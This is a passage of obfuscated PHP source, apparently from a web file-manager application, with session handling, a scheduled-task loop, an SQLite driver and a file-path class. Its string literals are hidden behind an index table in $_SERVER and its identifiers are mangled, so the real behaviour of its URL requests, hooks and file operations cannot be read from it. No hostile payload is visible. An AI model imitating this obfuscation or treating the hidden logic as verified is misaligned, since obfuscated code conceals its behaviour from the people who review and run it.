$GLOBALS[$…¥Ÿæİ[6]][$…¥Ÿæİ[358]]; self::$sessionTime = $êÓ½Òœ[$…¥Ÿæİ[1606]]; $µŠ¨¹–Œ = isset($GLOBALS[$…¥Ÿæİ[1607]]) ? $GLOBALS[$…¥Ÿæİ[1607]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($µŠ¨¹–Œ)) { self::$sessionSign = Cookie::get($µŠ¨¹–Œ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($µŠ¨¹–Œ, self::$sessionSign, self::$sessionTime); $»¨å±Ëú = $êÓ½Òœ[$…¥Ÿæİ[1608]]; $™è¢Šü = $êÓ½Òœ[$»¨å±Ëú]; $°ê’ˆ” = $êÓ½Òœ[$…¥Ÿæİ[829]]; switch ($»¨å±Ëú) { case $…¥Ÿæİ[31]: self::$handle = Model($…¥Ÿæİ[830]); break; case $…¥Ÿæİ[831]: self::$handle = new CacheRedis($™è¢Šü, $°ê’ˆ”); break; case $…¥Ÿæİ[832]: self::$handle = new CacheMemcached($™è¢Šü, $°ê’ˆ”); break; case $…¥Ÿæİ[209]: $™è¢Šü[$…¥Ÿæİ[94]] = $™è¢Šü[$…¥Ÿæİ[94]] . $…¥Ÿæİ[1609]; self::$handle = new CacheFile($™è¢Šü, $°ê’ˆ”); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $šÌÊŸÏö = new self(); return $šÌÊŸÏö; } public static function getBySign($¦¡»ËøÑ) { CacheLock::lock($¦¡»ËøÑ); $÷’™Ê®Ê = self::$handle->get($¦¡»ËøÑ); CacheLock::unlock($¦¡»ËøÑ); $÷’™Ê®Ê = unserialize($÷’™Ê®Ê); return is_array($÷’™Ê®Ê) ? $÷’™Ê®Ê : array(); } public static function setBySign($Ê‹àè†¸, $ÍìµÄÇ¹) { CacheLock::lock($Ê‹àè†¸); self::$handle->set($Ê‹àè†¸, serialize($ÍìµÄÇ¹), self::$sessionTime); CacheLock::unlock($Ê‹àè†¸); } public static function sign($ÕÑø¨¨Ä = false) { $ÕÑø¨¨Ä && (self::$sessionSign = $ÕÑø¨¨Ä); self::init(); return self::$sessionSign; } public static function set($ã¸Ôè, $äË‚ÙóÎ = false) { self::init(); if (is_array($ã¸Ôè)) { foreach ($ã¸Ôè as $ÖæÜ”Íâ => $‹Œ½›Ğ¥) { array_set_value(self::$data, $ÖæÜ”Íâ, $‹Œ½›Ğ¥); } } else { array_set_value(self::$data, $ã¸Ôè, $äË‚ÙóÎ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ÿù•éÜ¥ = false) { self::init(); if (!$Ÿù•éÜ¥) { return self::$data; } return array_get_value(self::$data, $Ÿù•éÜ¥); } public static function remove($ØË¬ªê) { self::init(); unset(self::$data[$ØË¬ªê]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¤·²È‰º][834])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $©âÀ™„… =& $_SERVER[¤·²È‰º]; if (self::valueGet($©âÀ™„…[751]) != $©âÀ™„…[98]) { return; } if (self::valueGet($©âÀ™„…[1610]) == $©âÀ™„…[98]) { $£æ»ŸÎ“ = self::valueGet($©âÀ™„…[1611]); if (time() - $£æ»ŸÎ“ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$©âÀ™„…[1612]] = 1; self::valueSet($©âÀ™„…[1610], $©âÀ™„…[98]); self::log($©âÀ™„…[1613] . ACTION . $©âÀ™„…[1614]); Session::$data = array(); Session::$sessionSign = $©âÀ™„…[12]; $GLOBALS[$©âÀ™„…[511]] = 1; Hook::bind($©âÀ™„…[1615], $©âÀ™„…[1616]); $¶½ ùíí = 0; while (!0) { self::cacheClear(); if (self::valueGet($©âÀ™„…[751]) != $©âÀ™„…[98]) { self::valueSet($©âÀ™„…[1610], $©âÀ™„…[207]); self::log($©âÀ™„…[1617]); die; } $ «ŒÖá÷ = time(); if ($ «ŒÖá÷ - $¶½ ùíí >= 60) { self::valueSet(array($©âÀ™„…[1610] => $©âÀ™„…[98], $©âÀ™„…[1611] => $ «ŒÖá÷), !1); $¶½ ùíí = $ «ŒÖá÷; } if (!file_exists(USER_SYSTEM . $©âÀ™„…[1618])) { self::valueSet(array($©âÀ™„…[1610] => $©âÀ™„…[207], $©âÀ™„…[751] => $©âÀ™„…[207]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $‹¤àš­³ =& $_SERVER[¤·²È‰º]; http_close(); self::valueSet($‹¤àš­³[751], $‹¤àš­³[207]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‹¤àš­³[1610] => $‹¤àš­³[207], $‹¤àš­³[751] => $‹¤àš­³[98]), !1); } public static function taskSwitch() { $¹«ÁåĞ =& $_SERVER[¤·²È‰º]; $ÀŸ‡İ†Ï = self::valueGet($¹«ÁåĞ[751]) == $¹«ÁåĞ[98] ? $¹«ÁåĞ[207] : $¹«ÁåĞ[98]; self::valueSet($¹«ÁåĞ[751], $ÀŸ‡İ†Ï); } public static function shutdownEvent() { $’œ‚îÁ‹ =& $_SERVER[¤·²È‰º]; self::valueSet($’œ‚îÁ‹[1610], $’œ‚îÁ‹[207]); self::log($’œ‚îÁ‹[1619]); } public static function config($ÎÃÈ®×», $¨§£ååà) { self::valueSet($_SERVER[¤·²È‰º][751], $ÎÃÈ®×»); } private static function taskRunAll() { $Íğïäº’ =& $_SERVER[¤·²È‰º]; $âı®œÓ = timeFloat(); $ÄÂ´ëÃ¨ = Model($Íğïäº’[1620])->listData(); $ã¸ïËå = count($ÄÂ´ëÃ¨); for ($ŸŠàâå„ = 0; $ŸŠàâå„ < $ã¸ïËå; $ŸŠàâå„++) { $ÏÎ™ÈÎ× = $ÄÂ´ëÃ¨[$ŸŠàâå„]; if (!$ÏÎ™ÈÎ×[$Íğïäº’[407]] || $ÏÎ™ÈÎ×[$Íğïäº’[1621]] != $Íğïäº’[98]) { continue; } if (!self::taskTimeCheck($ÏÎ™ÈÎ×)) { continue; } self::taskRun($ÏÎ™ÈÎ×); } Hook::trigger($Íğïäº’[1622]); self::taskQueueRun($âı®œÓ); } private static function taskQueueRun($ˆúùš°) { $¹¶‚Šé¹ = 10; while (!0) { $ƒĞ¾ƒÃØ = TaskQueue::run(); if ($ƒĞ¾ƒÃØ === !1) { break; } if (timeFloat() - $ˆúùš° >= $¹¶‚Šé¹) { break; } } } private static function taskTimeCheck($—ÇŞÂ§) { $¡©¥»Œ =& $_SERVER[¤·²È‰º]; $Ù„®™Óù = json_decode($—ÇŞÂ§[$¡©¥»Œ[213]], !0); $ÑëÄÜˆ¶ = intval($—ÇŞÂ§[$¡©¥»Œ[1611]]); $æ¿¨“ˆš = strtotime($¡©¥»Œ[1623] . $Ù„®™Óù[$¡©¥»Œ[1624]] . $¡©¥»Œ[1625]) - strtotime($¡©¥»Œ[1626]); $–ï§ßõ× = time() - strtotime(date($¡©¥»Œ[1627]) . $¡©¥»Œ[1628]); $Ôç·ßö’ = $–ï§ßõ× >= $æ¿¨“ˆš && $–ï§ßõ× <= $æ¿¨“ˆš + 3600; switch ($Ù„®™Óù[$¡©¥»Œ[43]]) { case $¡©¥»Œ[1629]: if (time() - $ÑëÄÜˆ¶ < 3600 * 24 * 30) { return !1; } if ($Ù„®™Óù[$¡©¥»Œ[1629]] == date($¡©¥»Œ[1630]) && $Ôç·ßö’) { return !0; } break; case $¡©¥»Œ[1631]: if (time() - $ÑëÄÜˆ¶ < 3600 * 24 * 7) { return !1; } $°ó»ßÅ‘ = date($¡©¥»Œ[1632]) == 0 ? 7 : date($¡©¥»Œ[1632]); if ($Ù„®™Óù[$¡©¥»Œ[1631]] == $°ó»ßÅ‘ && $Ôç·ßö’) { return !0; } break; case $¡©¥»Œ[1624]: if (time() - $ÑëÄÜˆ¶ < 3600 * 24) { return !1; } if ($Ôç·ßö’) { return !0; } break; case $¡©¥»Œ[1633]: if (time() - $ÑëÄÜˆ¶ >= floatval($Ù„®™Óù[$¡©¥»Œ[1633]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ã”›­¾Š =& $_SERVER[¤·²È‰º]; static $ßïä›ä® = 0; $ÉÛçß‡ = 300; if (!$ßïä›ä®) { $ßïä›ä® = time(); } if (time() - $ßïä›ä® < $ÉÛçß‡) { return; } $ßïä›ä® = time(); $åä†Ü÷• = Model($ã”›­¾Š[521])->db($ã”›­¾Š[12]); if ($åä†Ü÷•) { $åä†Ü÷•->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ã”›­¾Š[1634], $ã”›­¾Š[1635]); die; } } public static function taskRun($ñÛÜ¨ ) { $ÚËöÏÎÃ =& $_SERVER[¤·²È‰º]; self::log($ÚËöÏÎÃ[1636] . $ñÛÜ¨ [$ÚËöÏÎÃ[407]] . $ÚËöÏÎÃ[1637] . $ñÛÜ¨ [$ÚËöÏÎÃ[42]] . $ÚËöÏÎÃ[1638] . $ñÛÜ¨ [$ÚËöÏÎÃ[1639]]); Model($ÚËöÏÎÃ[1620])->run($ñÛÜ¨ [$ÚËöÏÎÃ[407]]); $Åù¤Ç·á = timeFloat(); $º‘÷¶Ô† = $ÚËöÏÎÃ[12]; switch ($ñÛÜ¨ [$ÚËöÏÎÃ[43]]) { case $ÚËöÏÎÃ[316]: $÷İ˜³‹µ = url_request($ñÛÜ¨ [$ÚËöÏÎÃ[1639]], $ÚËöÏÎÃ[240], !1, !1, !1, !1, 10); if ($÷İ˜³‹µ[$ÚËöÏÎÃ[751]]) { $º‘÷¶Ô† = strlen($÷İ˜³‹µ[$ÚËöÏÎÃ[1187]]); } break; case $ÚËöÏÎÃ[239]: $º‘÷¶Ô† = Hook::apply($ñÛÜ¨ [$ÚËöÏÎÃ[1639]]); default: break; } Model($ÚËöÏÎÃ[1640])->add(array($ÚËöÏÎÃ[1641] => $ÚËöÏÎÃ[12], $ÚËöÏÎÃ[1642] => $ÚËöÏÎÃ[207], $ÚËöÏÎÃ[43] => $ÚËöÏÎÃ[1643] . $ñÛÜ¨ [$ÚËöÏÎÃ[407]], $ÚËöÏÎÃ[1644] => json_encode(array($ÚËöÏÎÃ[42] => $ñÛÜ¨ [$ÚËöÏÎÃ[42]], $ÚËöÏÎÃ[1645] => timeFloat() - $Åù¤Ç·á, $ÚËöÏÎÃ[302] => $º‘÷¶Ô†)))); $³Åëë„’ = $º‘÷¶Ô† ? $ÚËöÏÎÃ[1646] . $º‘÷¶Ô† : $ÚËöÏÎÃ[12]; self::log($ÚËöÏÎÃ[1647] . $ñÛÜ¨ [$ÚËöÏÎÃ[407]] . $ÚËöÏÎÃ[174] . $³Åëë„’); return !0; } private static function valueGet($¼ÓÇÏØÕ) { $¥ëéÒ“ì =& $_SERVER[¤·²È‰º]; $Ş„şñË² = $¥ëéÒ“ì[1648]; $Èã”›¶Ì = Model($¥ëéÒ“ì[443])->get($¼ÓÇÏØÕ, $Ş„şñË²); if (is_null($Èã”›¶Ì)) { Model($¥ëéÒ“ì[443])->set($¥ëéÒ“ì[751], $¥ëéÒ“ì[98], $Ş„şñË²); Model($¥ëéÒ“ì[443])->set($¥ëéÒ“ì[1610], $¥ëéÒ“ì[207], $Ş„şñË²); $Èã”›¶Ì = Model($¥ëéÒ“ì[443])->get($¼ÓÇÏØÕ, $Ş„şñË²); } return $Èã”›¶Ì; } private static function valueSet($“œó˜, $³¾œªÌª) { $¤ªª«ğó =& $_SERVER[¤·²È‰º]; $÷Ÿû®¸Ï = $¤ªª«ğó[1649]; CacheLock::lock($÷Ÿû®¸Ï); $¶°ÚèÅ = Model($¤ªª«ğó[443])->set($“œó˜, $³¾œªÌª, $¤ªª«ğó[1648]); CacheLock::unlock($÷Ÿû®¸Ï); return $¶°ÚèÅ; } protected static function log($üˆÍã¸ï) { write_log($üˆÍã¸ï, $_SERVER[¤·²È‰º][1635]); } private static function cacheClear() { $Ë½¨„÷ =& $_SERVER[¤·²È‰º]; Cache::clearMemory(Model($Ë½¨„÷[443])->cacheKey($Ë½¨„÷[1648])); Cache::clearMemory(Model($Ë½¨„÷[443])->cacheKey($Ë½¨„÷[1650])); Model($Ë½¨„÷[1620])->cacheClear(); self::closeDatabase(); } } goto báÂí‚İÕÖ; Aˆ±¿º‘‰Ù: class DbSqlite3Base extends Db { public function __construct($ğâñ¥äı = '') { $–ßÅ’ˆê =& $_SERVER[¤·²È‰º]; if (!class_exists($–ßÅ’ˆê[64])) { think_exception(think_lang($–ßÅ’ˆê[24]) . $–ßÅ’ˆê[65]); } if (!empty($ğâñ¥äı)) { if (!isset($ğâñ¥äı[$–ßÅ’ˆê[26]])) { $ğâñ¥äı[$–ßÅ’ˆê[26]] = 438; } $this->config = $ğâñ¥äı; if (empty($this->config[$–ßÅ’ˆê[27]])) { $this->config[$–ßÅ’ˆê[27]] = array(); } } } public function connect($æ¸éÅ = '', $††”‡™µ = 0) { $…Æ‘åûµ =& $_SERVER[¤·²È‰º]; if (!isset($this->linkID[$††”‡™µ])) { if (empty($æ¸éÅ)) { $æ¸éÅ = $this->config; } $this->linkID[$††”‡™µ] = new SQLite3($æ¸éÅ[$…Æ‘åûµ[31]]); if (!$this->linkID[$††”‡™µ]) { think_exception($this->linkID[$††”‡™µ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$††”‡™µ]->busyTimeout(30000); if (1 != think_config($…Æ‘åûµ[32])) { unset($this->config); } } return $this->linkID[$††”‡™µ]; } public function free() { $this->queryID = null; } public function query($Èïéú×½) { $Ã„Şºæì =& $_SERVER[¤·²È‰º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Èïéú×½; if ($this->queryID) { $this->free(); } think_action_status($Ã„Şºæì[33], 1); think_status($Ã„Şºæì[34]); $this->queryID = $this->_linkID->query($Èïéú×½); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‘²ğÔ«† = $this->getAll(); $this->numRows = count($‘²ğÔ«†); return $‘²ğÔ«†; } } public function execute($Î£ÈŠ‹Ê) { $¬ËéÕ„ı =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Î£ÈŠ‹Ê; if ($this->queryID) { $this->free(); } think_action_status($¬ËéÕ„ı[35], 1); think_status($¬ËéÕ„ı[34]); $ø–•Öìø = $this->_linkID->exec($Î£ÈŠ‹Ê); $this->debug(); if (!1 === $ø–•Öìø) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¤·²È‰º][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²Ÿƒµö¾ = $this->_linkID->query($_SERVER[¤·²È‰º][37]); if (!$²Ÿƒµö¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ‡°±¦æ = $this->_linkID->query($_SERVER[¤·²È‰º][38]); if (!$Æ‡°±¦æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ößˆü˜´ = array(); while ($öåüĞÔ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ößˆü˜´[] = $öåüĞÔ; } $this->queryID->reset(); return $Ößˆü˜´; } public function getFields($–ø±Ø·–) { $¶¸Ë‡« =& $_SERVER[¤·²È‰º]; $ÖŒ‘®Ğç = $this->query($¶¸Ë‡«[39] . $–ø±Ø·– . $¶¸Ë‡«[40]); $Å©ßê¬â = array(); if ($ÖŒ‘®Ğç) { foreach ($ÖŒ‘®Ğç as $Óı¨Ìô¯ => $šÇŞï×ú) { $Å©ßê¬â[$šÇŞï×ú[$¶¸Ë‡«[42]]] = array($¶¸Ë‡«[42] => $šÇŞï×ú[$¶¸Ë‡«[42]], $¶¸Ë‡«[43] => $šÇŞï×ú[$¶¸Ë‡«[43]], $¶¸Ë‡«[45] => (bool) ($šÇŞï×ú[$¶¸Ë‡«[45]] === $¶¸Ë‡«[12]), $¶¸Ë‡«[47] => $šÇŞï×ú[$¶¸Ë‡«[66]], $¶¸Ë‡«[49] => (bool) $šÇŞï×ú[$¶¸Ë‡«[67]], $¶¸Ë‡«[52] => (bool) $šÇŞï×ú[$¶¸Ë‡«[67]]); } } return $Å©ßê¬â; } public function getTables($½²ÅÇÇ¦ = '') { $Ôä¹Šã =& $_SERVER[¤·²È‰º]; $ÀÖì° = $this->query($Ôä¹Šã[55] . $Ôä¹Šã[56] . $Ôä¹Šã[57]); $¾éŒÍÎ“ = array(); foreach ($ÀÖì° as $ºñ€ÌÚù => $ş´¾»Şæ) { $¾éŒÍÎ“[$ºñ€ÌÚù] = current($ş´¾»Şæ); } return $¾éŒÍÎ“; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¤×Şüû =& $_SERVER[¤·²È‰º]; $this->error = $this->_linkID->lastErrorMsg(); if ($¤×Şüû[12] != $this->queryStr) { $this->error .= LNG($¤×Şüû[58]) . $this->queryStr; } think_trace($this->error, $¤×Şüû[12], $¤×Şüû[59]); return $this->error; } public function escapeString($ìÃîÀâí) { $¥Í«ù‚Š =& $_SERVER[¤·²È‰º]; if ($this->_linkID) { return $this->_linkID->escapeString($ìÃîÀâí); } return str_ireplace($¥Í«ù‚Š[68], $¥Í«ù‚Š[69], $ìÃîÀâí); } public function parseLimit($Å¶‰ıˆ÷) { $¢„Äç§ =& $_SERVER[¤·²È‰º]; $£°¤Š¹¸ = $¢„Äç§[12]; if (!empty($Å¶‰ıˆ÷)) { $Å¶‰ıˆ÷ = explode($¢„Äç§[60], $Å¶‰ıˆ÷); if (count($Å¶‰ıˆ÷) > 1) { $£°¤Š¹¸ .= $¢„Äç§[61] . $Å¶‰ıˆ÷[1] . $¢„Äç§[62] . $Å¶‰ıˆ÷[0] . $¢„Äç§[63]; } else { $£°¤Š¹¸ .= $¢„Äç§[61] . $Å¶‰ıˆ÷[0] . $¢„Äç§[63]; } } return $£°¤Š¹¸; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÀûŸÁÑ  =& $_SERVER[¤·²È‰º]; $this->objectDriver = array($ÀûŸÁÑ [70], $ÀûŸÁÑ [71], $ÀûŸÁÑ [72], $ÀûŸÁÑ [73], $ÀûŸÁÑ [74], $ÀûŸÁÑ [75], $ÀûŸÁÑ [76], $ÀûŸÁÑ [77], $ÀûŸÁÑ [78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¼¿×µè) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¼¿×µè, $_SERVER[¤·²È‰º][8]); } return $¼¿×µè; } public function iconvApp($ì×ûÙÍ) { return $ì×ûÙÍ; } public function iconvSystem($Óı†‡ƒ±) { return $Óı†‡ƒ±; } public function iconvTo($¥´¤ñÙÂ, $ç­½ü», $„Õ‚) { $õ‰Êıœ =& $_SERVER[¤·²È‰º]; if (!$¥´¤ñÙÂ || !function_exists($õ‰Êıœ[79])) { return $¥´¤ñÙÂ; } static $²¯»ö®¶ = array(); $ÒÌ…¿¬ = $ç­½ü» . $õ‰Êıœ[80] . $„Õ‚ . $õ‰Êıœ[81] . $¥´¤ñÙÂ; if (isset($²¯»ö®¶[$ÒÌ…¿¬])) { return $²¯»ö®¶[$ÒÌ…¿¬]; } if (function_exists($õ‰Êıœ[82])) { $õÒ¶ÍŒÅ = @mb_convert_encoding($¥´¤ñÙÂ, $„Õ‚, $ç­½ü»); } else { $õÒ¶ÍŒÅ = @iconv($ç­½ü», $„Õ‚, $¥´¤ñÙÂ); } $õÒ¶ÍŒÅ = $õÒ¶ÍŒÅ ? $õÒ¶ÍŒÅ : $¥´¤ñÙÂ; if (strstr($õÒ¶ÍŒÅ, $õ‰Êıœ[83])) { $õÒ¶ÍŒÅ = str_replace($õ‰Êıœ[83], $õ‰Êıœ[11], $õÒ¶ÍŒÅ); } $²¯»ö®¶[$ç­½ü» . $õ‰Êıœ[80] . $„Õ‚ . $õ‰Êıœ[81] . $¥´¤ñÙÂ] = $õÒ¶ÍŒÅ; $²¯»ö®¶[$„Õ‚ . $õ‰Êıœ[80] . $ç­½ü» . $õ‰Êıœ[81] . $¥´¤ñÙÂ] = $¥´¤ñÙÂ; $²¯»ö®¶[$„Õ‚ . $õ‰Êıœ[80] . $ç­½ü» . $õ‰Êıœ[81] . $õÒ¶ÍŒÅ] = $¥´¤ñÙÂ; $²¯»ö®¶[$ç­½ü» . $õ‰Êıœ[80] . $„Õ‚ . $õ‰Êıœ[81] . $õÒ¶ÍŒÅ] = $õÒ¶ÍŒÅ; return $õÒ¶ÍŒÅ; } public function getPathInner($¹«¹Š–ø) { $ÖÂñ€œĞ = IO::init($¹«¹Š–ø); return $ÖÂñ€œĞ->path; } public function getPathOuter($Š–©ù›) { $ßĞ§Ä =& $_SERVER[¤·²È‰º]; $·ŸÓæÛ¨ = strlen(trim($this->pathBase, $ßĞ§Ä[8])); $Š–©ù› = substr(trim($Š–©ù›, $ßĞ§Ä[8]), $·ŸÓæÛ¨); return $this->pathDriver . $ßĞ§Ä[8] . ltrim($Š–©ù›, $ßĞ§Ä[8]); } public function isParentOf($„éÃ¹¶, $¾ªì†¶™) { $“ÅÀìèÀ =& $_SERVER[¤·²È‰º]; $„éÃ¹¶ = rtrim(strtolower($„éÃ¹¶), $“ÅÀìèÀ[8]) . $“ÅÀìèÀ[8]; $¾ªì†¶™ = rtrim(strtolower($¾ªì†¶™), $“ÅÀìèÀ[8]) . $“ÅÀìèÀ[8]; $·š¶²·õ = strpos($¾ªì†¶™, $„éÃ¹¶) === 0; return $·š¶²·õ; } public function getType() { $¦´Ş¢„ =& $_SERVER[¤·²È‰º]; $¦É…ú—Ê = str_replace($¦´Ş¢„[84], $¦´Ş¢„[12], get_class($this)); return strtolower($¦É…ú—Ê); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ã‘á¹“á, $ËãŸÙ›˜) { $­æòâÉ› =& $_SERVER[¤·²È‰º]; $çûÜãğ® = rtrim($ã‘á¹“á, $­æòâÉ›[8]) . $­æòâÉ›[8] . $ËãŸÙ›˜; $Ï‡Ÿ˜ì„ = $this->exist($çûÜãğ®); return $Ï‡Ÿ˜ì„ ? $çûÜãğ® : !1; } public function setModifyTime($¼ôëÌŠ¢, $…Ôª¨Óˆ = '') { } public function renameObject($Îîó½”®, $«°¿¦Â») { $øìôäÈ = $«°¿¦Â»; $Îîó½”® = $this->getPathOuter($Îîó½”®); $«°¿¦Â» = $this->pathFather($Îîó½”®) . $«°¿¦Â»; $—Å•®ß = IO::copy($Îîó½”®, $this->pathFather($Îîó½”®), REPEAT_RENAME_FOLDER, $øìôäÈ); if ($—Å•®ß) { IO::remove($Îîó½”®); } return $—Å•®ß ? $«°¿¦Â» : !1; } public function tempFile($Üº¯Ñóš = '', $Ã‡æ®ÔÕ = '') { if (!$Üº¯Ñóš) { $Üº¯Ñóš = rand_string(15); } $ĞœÀë¾É = TEMP_FILES . rand_string(15) . $_SERVER[¤·²È‰º][8]; @mkdir($ĞœÀë¾É, DEFAULT_PERRMISSIONS, !0); $Û½»ªË– = $ĞœÀë¾É . $Üº¯Ñóš; @touch($Û½»ªË–); if ($Ã‡æ®ÔÕ) { file_put_contents($Û½»ªË–, $Ã‡æ®ÔÕ); } return $Û½»ªË–; } public function tempFileRemve($¿ì§«õğ) { @unlink($¿ì§«õğ); @rmdir($this->pathFather($¿ì§«õğ)); } public function mkfile($ïã×‰‚Ó, $¨ƒÀñ¡ = '', $û›œÉ¾¡ = REPEAT_RENAME) { } public function mkdir($ñÙÇÅÑë, $Û¬…íÆ¦ = REPEAT_SKIP) { } public function delFile($á­üì¦ä) { } public function delFolder($²×¥Ññ¤) { } public function copyFile($¾°Øíô¯, $ƒ¹‘ü¿ğ) { } public function moveFile($À´’ÓéŸ, $¨ÓÃŸ) { } public function remove($¼ñÚ°áÆ) { if ($this->isFile($¼ñÚ°áÆ)) { return $this->delFile($¼ñÚ°áÆ); } return $this->delFolder($¼ñÚ°áÆ); } public function rename($ûşö¨ç, $é¿©×¶ü) { } public function exist($®€Éªü) { } public function findByHash($Ó˜€‘ªö = '', $¡¿ŠÜš = '') { return !1; } public function isFile($¬²­ı) { } public function isFolder($’×Ûåİç) { } public function size($”äøÔüè) { } public function info($¤²‰éõÂ) { } public function infoSimple($²ùá©éÆ) { return $this->info($²ùá©éÆ); } public function infoAuth($İü¨–¹ç) { return $this->info($İü¨–¹ç); } public function infoFull($Ó¶©—›³) { return $this->info($Ó¶©—›³); } public function infoWithChildren($Îş‹×³Ç) { $ŞœüàÂ =& $_SERVER[¤·²È‰º]; static $ËØÛ´Ä™ = array(); if (isset($ËØÛ´Ä™[$Îş‹×³Ç])) { return $ËØÛ´Ä™[$Îş‹×³Ç]; } $İóœ‰”è = $this->info($Îş‹×³Ç); if ($İóœ‰”è && $İóœ‰”è[$ŞœüàÂ[43]] == $ŞœüàÂ[85]) { $•İş«Ìî = array($ŞœüàÂ[86] => 0, $ŞœüàÂ[87] => 0, $ŞœüàÂ[88] => 0); $this->infoChildren($Îş‹×³Ç, $•İş«Ìî); $İóœ‰”è[$ŞœüàÂ[86]] = $•İş«Ìî[$ŞœüàÂ[86]]; $İóœ‰”è[$ŞœüàÂ[89]] = array($ŞœüàÂ[90] => $•İş«Ìî[$ŞœüàÂ[87]], $ŞœüàÂ[91] => $•İş«Ìî[$ŞœüàÂ[88]]); $ËØÛ´Ä™[$Îş‹×³Ç] = $İóœ‰”è; } return $İóœ‰”è; } public function listPath($¥İˆªü», $ÆÕÎ×å¸ = false) { } public function has($™Ú…¯áš, $–Í¹§œå = false, $ô½†”¢ò = false) { } public function canRead($ªû—Ä) { } public function canWrite($‹ÅÌ‘ø˜) { } public function getContent($ââ¨Íˆ) { } public function setContent($õöÅÖÁ‰, $úô–ïÕÏ = '') { } protected function infoChildren($óœİ€§¹, &$ç¢åë€) { $ãáÑ›Çö =& $_SERVER[¤·²È‰º]; check_abort_echo(); $ößˆçÆØ = $this->listPath($óœİ€§¹, !0); $ößˆçÆØ = array_merge($ößˆçÆØ[$ãáÑ›Çö[92]], $ößˆçÆØ[$ãáÑ›Çö[93]]); foreach ($ößˆçÆØ as $Ùô¼×°ü) { if ($Ùô¼×°ü[$ãáÑ›Çö[43]] == $ãáÑ›Çö[85]) { $ç¢åë€[$ãáÑ›Çö[88]]++; $½òÃ²¶è = $this->getPathInner($Ùô¼×°ü[$ãáÑ›Çö[94]]); $this->infoChildren($½òÃ²¶è, $ç¢åë€); } else { $ç¢åë€[$ãáÑ›Çö[87]]++; $ç¢åë€[$ãáÑ›Çö[86]] += $Ùô¼×°ü[$ãáÑ›Çö[86]]; } } } public function fileSubstr($¥­Åü©, $ìÓÖœÜ, $ıæ…•â„) { } public function listAll($‡è§à‡¯) { } public function listAllMake($³òŠÃ÷ı, &$Œ¾€²ñ) { $úèš§öÄ =& $_SERVER[¤·²È‰º]; check_abort_echo(); $ö£´Œîú = $this->listPath($³òŠÃ÷ı, !0); if (!$ö£´Œîú) { return; } $ÂÜê“Œñ = array_merge($ö£´Œîú[$úèš§öÄ[92]], $ö£´Œîú[$úèš§öÄ[93]]); foreach ($ÂÜê“Œñ as $úà¡ú½Í) { $ÈÍÃîËé = $úà¡ú½Í[$úèš§öÄ[43]] == $úèš§öÄ[85]; $è°å«¾² = array($úèš§öÄ[94] => $úà¡ú½Í[$úèš§öÄ[94]], $úèš§öÄ[85] => $ÈÍÃîËé); if (isset($úà¡ú½Í[$úèš§öÄ[86]])) { $è°å«¾²[$úèš§öÄ[86]] = $úà¡ú½Í[$úèš§öÄ[86]]; } if (isset($úà¡ú½Í[$úèš§öÄ[95]])) { $è°å«¾²[$úèš§öÄ[95]] = $úà¡ú½Í[$úèš§öÄ[95]]; } if (!$ÈÍÃîËé) { $Œ¾€²ñ[] = $è°å«¾²; continue; } $Œ¾€²ñ[] = $è°å«¾²; $¸ˆ á— = $úà¡ú½Í[$úèš§öÄ[94]]; $Í†õ¹Ÿ¿ = $this->pathDriver; if (substr($úà¡ú½Í[$úèš§öÄ[94]], 0, strlen($Í†õ¹Ÿ¿)) == $Í†õ¹Ÿ¿) { $¸ˆ á— = substr($¸ˆ á—, strlen($Í†õ¹Ÿ¿)); } $this->listAllMake($¸ˆ á—, $Œ¾€²ñ); } } public function listAllSimple($µÅäÄ®) { $Ì’Ãà· =& $_SERVER[¤·²È‰º]; $‹œ® ˜® = array(); $Ç¾ûĞì– = $this->listAll($µÅäÄ®); $ú÷éÎ™Â = $this->getPathOuter($µÅäÄ®); foreach ($Ç¾ûĞì– as $ÉØº™‰ä) { $û³âñ™ò = $ÉØº™‰ä[$Ì’Ãà·[94]]; $üïËêõ¨ = $ÉØº™‰ä[$Ì’Ãà·[94]]; if (isset($ÉØº™‰ä[$Ì’Ãà·[96]])) { $û³âñ™ò = $ÉØº™‰ä[$Ì’Ãà·[96]][$Ì’Ãà·[94]]; $ÉØº™‰ä[$Ì’Ãà·[86]] = $ÉØº™‰ä[$Ì’Ãà·[96]][$Ì’Ãà·[86]]; $ÉØº™‰ä[$Ì’Ãà·[95]] = 